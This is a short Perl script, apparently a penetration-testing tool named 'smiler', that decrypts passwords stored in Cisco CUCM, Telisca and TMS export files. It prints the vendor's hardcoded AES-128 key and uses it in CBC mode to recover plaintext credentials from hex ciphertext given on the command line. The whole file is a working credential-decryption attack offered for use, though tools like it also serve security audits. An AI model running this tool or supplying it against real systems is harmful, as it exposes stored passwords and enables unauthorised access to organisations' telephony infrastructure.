#!/usr/bin/perl

####################################################################
# smiler
# ------
# Decrypt passwords for VoIP systems:
# Cisco CUCM (Cisco Unified Communications Manager - Call Manager),
# Cisco Telisca, Cisco TMS (TelePresence Management Suite)
#
# Decrypts encrypted passwords present in export files like
# platformconfig.xml, appuser.csv, enduser.csv, ldapauth.csv, etc.
#
# usage : $ perl cucm_decrypt_AES.pl \\
# c3f95341d6b42836d2700325d1310120411439e06cc54cc6fdd27c8eb8212639
#
# clé hardcodée dans com.cisco.ccm.security.CCMEncryption
#
# CCMDecryption.decryptPassword
# AES 128 bits key / CBC / PKCS5 padding method
####################################################################

use Crypt::CBC;

chomp (my $encoded = pack("H*", $ARGV[0]));

my $key = pack("H32", "736D65747379736F63736963636E6900");
my $iv = substr($encoded, 0, 16);
my $cyphered = substr($encoded, 16);

my $cipher = Crypt::CBC->new(
  -literal_key => 1,
  -key => $key,
  -keysize => 16,
  -iv => $iv,
  -cipher => 'Crypt::Cipher::AES',
  -header => 'none'
);

my $decyphered = $cipher->decrypt($cyphered);

print "Le mot de passe est : $decyphered\n";
